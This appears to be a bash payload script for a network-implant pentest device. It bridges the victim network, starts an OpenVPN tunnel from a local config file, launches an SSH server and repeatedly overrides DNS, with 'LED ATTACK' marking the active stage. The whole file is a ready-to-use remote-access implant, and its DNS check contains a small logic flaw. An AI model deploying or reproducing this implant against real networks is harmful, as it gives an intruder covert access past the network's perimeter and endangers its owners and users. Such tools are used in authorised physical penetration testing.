#!/bin/bash
# OpenVPN payload

# Set to 1 to allow clients to use the VPN
FOR_CLIENTS=0

DNS_SERVER="8.8.8.8"

# Cheap hack to set the DNS server
function setdns() {
	while true
	do
		[[ ! $(grep -q "$DNS_SERVER" /tmp/resolv.conf) ]] && {
			echo -e "search lan\nnameserver $DNS_SERVER" > /tmp/resolv.conf
		}
		sleep 5
	done
}

function start() {
	LED SETUP

	DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)

	# Set NETMODE to BRIDGE and wait 3 seconds
	# to ensure that things can settle
	
	[[ "$FOR_CLIENTS" == "1" ]] && {
		/usr/bin/NETMODE VPN
	} || {
		/usr/bin/NETMODE BRIDGE
	}
	sleep 3

	# Make OpenVPN use the local configuration
	uci set openvpn.vpn.config="${DIR}/config.ovpn"
	uci commit

	# Start the OpenVPN server in the background
	/etc/init.d/openvpn start

	# Start SSH Server
	/etc/init.d/sshd start &

	# Set DNS server
	setdns &

	LED ATTACK
}

# Start the payload
start &
